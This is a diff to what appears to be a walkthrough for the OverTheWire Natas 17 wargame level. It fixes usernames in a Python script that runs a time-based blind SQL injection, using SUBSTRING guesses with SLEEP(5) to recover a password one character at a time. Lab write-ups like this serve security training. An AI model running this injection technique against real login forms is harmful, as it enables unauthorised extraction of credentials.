@@ -210,7 +210,7 @@ for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
 ```python
 password_guess = correct_guesses + char
 print(password_guess)
-sqli = f'natas16" AND BINARY SUBSTRING(password, 1, { len(password_guess) }) = "{ password_guess }" AND SLEEP(5) -- '
+sqli = f'natas18" AND BINARY SUBSTRING(password, 1, { len(password_guess) }) = "{ password_guess }" AND SLEEP(5) -- '
 ```
 
 #### Step 5: Web Server Request
@@ -218,7 +218,7 @@ sqli = f'natas16" AND BINARY SUBSTRING(password, 1, { len(password_guess) }) = "
 ```python
 import requests
 
-response = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=("natas18", password), data={ "username": sqli })
+response = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=("natas17", password), data={ "username": sqli })
 ```
 
 #### Step 6: Response Handling
@@ -246,10 +246,10 @@ for i in range(0, 32):
     # Step 4: The SQL Injection String
     password_guess = correct_guesses + char
     print(password_guess)
-    sqli = f'natas16" AND BINARY SUBSTRING(password, 1, { len(password_guess) }) = "{ password_guess }" AND SLEEP(5) -- '
+    sqli = f'natas18" AND BINARY SUBSTRING(password, 1, { len(password_guess) }) = "{ password_guess }" AND SLEEP(5) -- '
 
     # Step 5: Web Server Request
-    response = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=("natas18", password), data={ "username": sqli })
+    response = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=("natas17", password), data={ "username": sqli })
 
     # Step 6: Response Handling
     if response.elapsed.total_seconds() > 5:
